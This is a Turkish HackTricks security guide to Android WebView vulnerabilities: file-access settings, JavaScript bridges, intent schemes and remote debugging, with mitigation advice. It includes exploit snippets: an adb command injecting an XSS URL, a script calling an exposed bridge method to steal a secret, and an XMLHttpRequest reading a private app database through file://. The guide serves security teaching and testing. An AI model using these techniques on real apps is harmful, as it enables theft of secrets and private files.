# Webview Saldırıları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## WebView Yapılandırmaları ve Güvenliği Rehberi

### WebView Zafiyetlerinin Genel Bakışı

Android geliştirmenin kritik bir yönü, WebViews'in doğru şekilde işlenmesini içerir. Bu rehber, WebView kullanımıyla ilişkili riskleri azaltmak için temel yapılandırmaları ve güvenlik uygulamalarını vurgular.

![WebView Örneği](<../../.gitbook/assets/image (718).png>)

### **WebViews'de Dosya Erişimi**

Varsayılan olarak, WebViews dosya erişimine izin verir. Bu işlevsellik, Android API seviyesi 3'ten beri mevcut olan `setAllowFileAccess()` yöntemi tarafından kontrol edilir. **android.permission.READ\_EXTERNAL\_STORAGE** iznine sahip uygulamalar, dosya URL şemasını kullanarak dış depolamadan dosyaları okuyabilir (`file://path/to/file`).

#### **Kullanımdan Kaldırılan Özellikler: Evrensel ve URL'lerden Dosya Erişimi**

* **Dosya URL'lerinden Evrensel Erişim**: Bu kullanımdan kaldırılan özellik, dosya URL'lerinden çapraz kökenli isteklere izin veriyordu ve potansiyel XSS saldırıları nedeniyle önemli bir güvenlik riski oluşturuyordu. Android Jelly Bean ve üzeri hedefleyen uygulamalar için varsayılan ayar devre dışı bırakılmıştır (`false`).
* Bu ayarı kontrol etmek için `getAllowUniversalAccessFromFileURLs()` kullanın.
* Bu ayarı değiştirmek için `setAllowUniversalAccessFromFileURLs(boolean)` kullanın.
* **Dosya URL'lerinden Dosya Erişimi**: Bu özellik de kullanımdan kaldırılmış olup, diğer dosya şema URL'lerinden içeriğe erişimi kontrol ediyordu. Evrensel erişim gibi, artırılmış güvenlik için varsayılan olarak devre dışı bırakılmıştır.
* Kontrol etmek için `getAllowFileAccessFromFileURLs()` kullanın ve ayarlamak için `setAllowFileAccessFromFileURLs(boolean)` kullanın.

#### **Güvenli Dosya Yükleme**

Varlıklara ve kaynaklara erişirken dosya sistemine erişimi devre dışı bırakmak için `setAllowFileAccess()` yöntemi kullanılır. Android R ve üzeri sürümlerde, varsayılan ayar `false`'dir.

* `getAllowFileAccess()` ile kontrol edin.
* `setAllowFileAccess(boolean)` ile etkinleştirin veya devre dışı bırakın.

#### **WebViewAssetLoader**

**WebViewAssetLoader** sınıfı, yerel dosyaları yüklemek için modern bir yaklaşımı temsil eder. Yerel varlıklara ve kaynaklara erişmek için http(s) URL'lerini kullanır ve Aynı Köken Politikası ile uyumlu olarak çalışır, böylece CORS yönetimini kolaylaştırır.

### loadUrl

Bu, bir webviewde keyfi URL'leri yüklemek için yaygın olarak kullanılan bir fonksiyondur:
```java
webview.loadUrl("<url here>")
```
### **JavaScript ve Intent Scheme İşleme**

- **JavaScript**: WebViews'de varsayılan olarak devre dışı bırakılmıştır, `setJavaScriptEnabled()` aracılığıyla etkinleştirilebilir. JavaScript'in uygun korumalar olmadan etkinleştirilmesi güvenlik açıklarına neden olabileceğinden dikkatli olunmalıdır.
- **Intent Scheme**: WebViews, `intent` şemasını işleyebilir ve dikkatli yönetilmezse sömürülere yol açabilir. Bir örnek güvenlik açığı, kötü niyetli bir şekilde kullanılabilecek "support\_url" adlı açık bir WebView parametresini içeriyordu ve bu durum çapraz site komut dosyası (XSS) saldırılarına yol açabilirdi.

![Zararlı WebView](<../../.gitbook/assets/image (719).png>)

adb kullanarak sömürü örneği:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
{% endcode %}

### Javascript Köprüsü

Android tarafından sağlanan bir özellik, bir WebView içindeki **JavaScript**'in **yerel Android uygulama işlevlerini** çağırmasını sağlar. Bu, JavaScript'i yerel Android işlevleriyle bütünleştiren `addJavascriptInterface` yöntemi kullanılarak gerçekleştirilir ve _WebView JavaScript köprüsü_ olarak adlandırılır. Bu yöntem, WebView içindeki tüm sayfaların kayıtlı JavaScript Arayüzü nesnesine erişmesine izin verdiği için dikkatli olunmalıdır; çünkü hassas bilgiler bu arayüzler aracılığıyla ifşa edilirse güvenlik riski oluşturabilir.

* Android sürümü 4.2'den düşük hedefleyen uygulamalar için **son derece dikkatli olunmalıdır** çünkü kötü amaçlı JavaScript kullanarak yansımayı sömürerek uzaktan kod yürütme izni veren bir zafiyet bulunmaktadır.

#### Bir JavaScript Köprüsü Uygulamak

* **JavaScript arayüzleri**, bir sınıf yönteminin JavaScript'e açıklandığı örneklerde olduğu gibi yerel kodla etkileşime geçebilir:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript Köprüsü, WebView'e bir arayüz eklenerek etkinleştirilir:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* JavaScript aracılığıyla potansiyel sömürü, örneğin bir XSS saldırısı yoluyla, açığa çıkarılan Java yöntemlerinin çağrılmasını sağlar:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Riskleri azaltmak için, **JavaScript köprüsü kullanımını kısıtlayın** ve uzaktan kaynaklardan JavaScript yüklenmesini engelleyin. Eski cihazlar için minimum API seviyesini 17 olarak ayarlayın.

### Yansıma Tabanlı Uzak Kod Yürütme (RCE)

* Belgelenmiş bir yöntem, belirli bir yükü çalıştırarak yansıma yoluyla RCE elde etmeyi sağlar. Bununla birlikte, `@JavascriptInterface` açıklaması izinsiz yöntem erişimini önler, saldırı yüzeyini sınırlar.

### Uzaktan Hata Ayıklama

* **Uzaktan hata ayıklama**, **Chrome Geliştirici Araçları** ile mümkündür ve WebView içeriği içinde etkileşim ve keyfi JavaScript yürütme sağlar.

#### Uzaktan Hata Ayıklamanın Etkinleştirilmesi

* Uzaktan hata ayıklama, bir uygulama içindeki tüm WebViews için şu şekilde etkinleştirilebilir:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Uygulamanın hata ayıklanabilir durumuna bağlı olarak hata ayıklamayı koşullu olarak etkinleştirmek için:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Keyfi Dosyaları Dışa Aktar

* Bir XMLHttpRequest kullanarak keyfi dosyaların dışa aktarılmasını gösterir:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referanslar

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) hakkında bilgi edinin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
